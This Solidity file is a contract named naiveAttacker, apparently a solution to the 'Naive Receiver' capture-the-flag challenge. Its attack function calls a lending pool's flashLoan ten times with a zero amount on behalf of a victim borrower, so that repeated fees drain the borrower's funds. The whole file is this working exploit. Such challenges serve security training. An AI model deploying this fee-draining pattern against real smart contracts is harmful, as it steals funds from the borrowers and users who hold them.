// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract naiveAttacker {
    NaiveReceiverLenderPool public pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address borrower) public {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(borrower, 0);
        }
    }
}
